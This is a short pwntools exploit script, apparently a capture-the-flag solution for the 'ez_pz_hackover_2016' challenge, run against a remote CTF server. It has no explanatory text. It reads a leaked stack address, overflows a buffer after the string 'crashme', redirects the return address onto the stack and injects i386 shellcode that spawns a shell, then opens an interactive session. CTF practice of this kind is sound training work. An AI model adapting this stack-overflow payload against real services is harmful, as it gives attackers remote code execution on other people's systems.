from pwn import *

context.log_level = 'debug'

#p = process('./ez_pz_hackover_2016')
p = remote('node3.buuoj.cn',28762)
#gdb.attach(, 'b *0x8048600')

header_addr = 0x804856b

p.recvuntil('crash: ')

s_addr = int(p.recv(10), 16)

shellcode = asm(shellcraft.sh(), arch='i386', os='linux')

payload = b'crashme\x00' + b'a' * (0x16 - 8 + 4) + p32(s_addr - 0x1c) + shellcode

p.recvuntil('> ')
p.sendline(payload)


p.interactive()
